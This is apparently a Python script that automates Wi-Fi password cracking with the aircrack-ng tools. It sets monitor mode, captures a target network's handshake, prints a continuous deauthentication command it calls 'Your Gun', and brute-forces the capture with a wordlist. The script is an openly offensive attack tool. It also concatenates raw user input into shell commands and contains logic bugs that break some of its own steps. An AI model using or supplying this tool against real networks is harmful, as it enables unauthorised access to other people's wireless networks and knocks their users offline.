import os, time

interface = ''

def choose_wl_generator():
  print('\t1) Run wl-creator.py to generate wordlist.')
  print('\t99) I\'ve my wordlist.')
  x = input(' -> ')
  if x == 1:
    os.system('python3 isee-wordlist.py')

def attack_network(network, cap_path):
  choose_wl_generator()
  w = str(input(' [ Wordlist Path ] -> '))
  os.system('sudo aircrack-ng -b ' + network[0] + ' -w ' + w + ' ' + cap_path + '-01.cap')
  input()

def monitor_network(network):
  global cap_path, interface
  os.system('clear')
  print(' [ Your Gun ]: sudo aireplay-ng -a ' + network[0] + ' --deauth 0 ' + interface)  
  net_name = str(input(' [ Network Name ] -> '))
  cap_path = net_name + '/' + net_name
  os.system('mkdir ' + net_name)
  os.system('sudo airodump-ng -w ' + cap_path + ' --bssid ' + network[0] + ' -c ' + network[1] + ' ' + interface)
  attack_network(network, cap_path)

def scan_networks():
  global interface
  os.system('sudo airodump-ng ' + interface)
  network = str(input('[ Paste whole row here ] -> '))
  network += ' ' # Parser purposes.

  block = []
  prop = ''
  n = False
  for c in network:
    if c == ' ':
      if n == True:
        block.append(prop)
        prop = ''
      n = False
    else:
      n = True
      prop += c
  monitor_network(((block[0], block[5])))

def monitor_mode():
  global interface
  os.system('sudo airmon-ng')
  i = str(input(' [ Interface ] -> '))
  os.system('sudo airmon-ng start ' + i)
  interface = i + 'mon'

def display_options(network):
  global interface
  print('\tBSSID:', network[0], '\tCHANNEL:', network[1],'\tINTERFACE:', interface)
  print('\t1) Enable Monitor Mode')
  print('\t2) Scan the Networks')

def main():
  wifi_network = (('', ''))

  x = -1
  while x != 0:
    os.system('clear')
    display_options(wifi_network)
    x = int(input(' -> '))
    if x == 1:
      monitor_mode()
    if x == 2:
      wifi_network = scan_networks()

main()